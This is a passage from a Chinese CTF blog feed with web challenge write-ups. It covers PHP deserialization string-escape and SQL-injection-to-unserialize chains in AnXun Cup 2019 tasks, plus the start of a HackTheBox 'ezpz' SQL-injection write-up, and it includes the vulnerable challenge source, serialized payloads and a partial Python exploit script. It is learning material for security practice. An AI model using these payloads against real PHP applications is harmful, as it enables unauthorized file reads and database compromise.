filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>漏洞点正在于此，在序列化数据之后，它经过了一层过滤才给变量赋值。而从最上方的过滤函数可知，出现被过滤的关键字直接替换为空。那么这是否会有漏洞可以用呢？答案是肯定的。出题人如是说：</p><blockquote><p>任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。</p></blockquote><p>其意义在于，给<code>user</code>所赋的值刚好24个，而这24个字符由于过滤<code>flag</code>的原因，在经过序列化后被置为空。这时就可以吞掉一个function，做到任意读取文件。</p><p>首先从提示phpinfo处找到一个不可直接读的php文件，我们先尝试利用漏洞读取它看看。（由于关键字里过滤了f1ag，所以在phpinfo界面搜f1ag关键字，果断发现d0g3_f1ag.php）<br>下面我来构造下序列化的类，从源码知道SESSION类有三个属性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SESSION</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $user=<span class="string">"flagflagflagflagflagflag"</span>;</span><br><span class="line">    <span class="keyword">var</span> $function=<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>;<span class="comment"># 其中为d0g3_f1ag.php base64编码</span></span><br><span class="line">    <span class="keyword">var</span> $img=<span class="string">"MS5qcGc="</span>;<span class="comment"># 值为1.jpg的base64编码</span></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> SESSION();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure><p>生成的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">"flagflagflagflagflagflag"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>而经过过滤后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>此时user属性对应的值被置空，那么它就要去把后面的24个字符置为它的值。也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a"</span></span><br></pre></td></tr></table></figure><p><strong>相当于吞掉了function属性</strong>，但是我们构造的<code>$function</code>中，包含了<code>img</code>属性的值，以及构造的一个<code>test</code>属性的值，使得我们的序列化数据仍然是满足一个类对应三个键值。这时它对序列化数据的匹配就是由<code>{</code>开始，到<code>}</code>结束。所以后面多余的字符<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code>全部被忽略。<br>这样，我们通过控制function属性的值，达到了控制<code>img</code>属性值的效果，从而触发反序列化，读取文件。<br>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure><p>(function也可以直接get传)<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" alt="flag"><br>另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,</span><br><span class="line">    <span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>,</span><br><span class="line">    <span class="string">"img"</span>=&gt;<span class="string">"MS5qcGc="</span>);</span><br><span class="line"><span class="keyword">echo</span>(serialize($b));</span><br></pre></td></tr></table></figure><h1 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h1><p>也是一道反序列化题目，意图在于反序列化结合sql注入。在源码审计上下了不少功夫。如果我在比赛中做多半会卡在sql注入上吧。</p><p>首先进入页面，可以发现网站底部留下了wowouploadimage，可以拿到一份源码。主要内容如下：<br>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$file = <span class="keyword">new</span> upload();</span><br><span class="line">$file-&gt;upload_base();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>helper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先从比较直观的地方开始审计。我个人首先从helper.php开始观察。因为这很有可能存在是一个反序列化利用的代码。果然首先注意到，helper类中，有着经典的<code>_destruct()</code>魔术方法，它调用的<code>view_file()</code>方法，会执行<code>file_get_contents()</code>函数。显然是利用它。回过头再仔细看下触发方式。<br>首先，在helper.php中，发现图片的<code>attr属性</code>被序列化存储。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;attr&quot;] &#x3D; serialize($my_ext);</span><br></pre></td></tr></table></figure><p>之后在show.php中，调用了一次反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后注意我们的upload图片操作，传图片后，调用了<code>check()</code>函数，但是并没有对文件名做检测就被保存为info，之后作为参数传进了<code>save()</code>函数。<code>save()</code>本质上执行了一次sql语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br></pre></td></tr></table></figure><p>也就是说，我们其实是通过控制上传图片的文件名，触发sql注入，进一步触发反序列化，达到目的。<br>所以现生成反序列化payoad:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure><p>得到结果需要调整为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"helper"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"\0\0\0ifview"</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"\0\0\0config"</span>;s:<span class="number">5</span>:<span class="string">"/flag"</span>;&#125;</span><br></pre></td></tr></table></figure><p>这是由于protected的属性决定的。如果是private则是两个<code>%00%00</code>。<br>然后构造文件名，我们只需让文件的序列化部分改为我们的payload。基于普通上传执行语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'pic/f20c76cc4fb41838.jpg'</span>,<span class="string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span>)</span><br></pre></td></tr></table></figure><p>我们把文件名改改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure><p>其中的由于引号问题，我们的payload需要字符串转16进制。<br>上传文件即可触发得到flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-ezpz</title>
      <link href="2020/02/06/hackthebox-ezpz/"/>
      <url>2020/02/06/hackthebox-ezpz/</url>
      
        <content type="html"><![CDATA[<p>hackthebox上的web challenge ezpz是去年十二月末才新出的一道ctf题目。这道题相当的有意思，而且对我还是比较有难度的，但是做出来的那一瞬间又发现其实并非那么令人困扰，反而学到了许多。所以在此记录一下做题过程。<br>感谢zjy师傅以及外国网友Z1LV3R的提示</p><a id="more"></a><p>首先进入页面，发现有两个报错：<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" alt="error1"></p><p>其中，第一个报错其实就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP: Notice: Undefined variable</span><br></pre></td></tr></table></figure><p>意思是有未定义变量，那么自然就是obj了。所以下一步我们传参变量<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" alt="error2"><br>那么如何解决第二个错误呢？从中可以看出，ID之于obj可能是property与object的关系。也就是说，obj可能是包含ID的某种序列化数据的变量。实际上，如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=<span class="keyword">array</span>(<span class="string">"ID"</span>=&gt;<span class="number">1234</span>);</span><br><span class="line"><span class="keyword">echo</span>($obj-&gt;IDS);<span class="comment">#此处访问一个未定义的IDS触发报错</span></span><br></pre></td></tr></table></figure><p>与</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=json_decode(<span class="string">"&#123;'ID':'1234'&#125;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;IDs;</span><br></pre></td></tr></table></figure><p>的返回都是：<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" alt="报错"><br>所以我们才能看到回显。因此尝试构造数据吧。加上题目页面源码中提示了<code>Hint : base64_encode($data)</code>&gt;（或者我们把obj置为数组，也可以触发报错，提示我们数据需要<code>base64encode</code>）<br>经过尝试，可以发现是要对json数据编码。那我们传一个ID值为1的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj&#x3D;eyJJRCI6ICIxIn0&#x3D;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" alt><br>而传<code>1&#39;</code>触发报错，传<code>1&quot;</code>无报错。确认是存在sql注入漏洞，且是单引号闭合类型。<br>于是，题目进入到了下一阶段，sql注入。<br>显然为了让我们的payload更方便，最好先写好exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://docker.hackthebox.eu:30163/index.php?obj="</span></span><br><span class="line">payload=<span class="string">"1"</span></span><br><span class="line">payload = 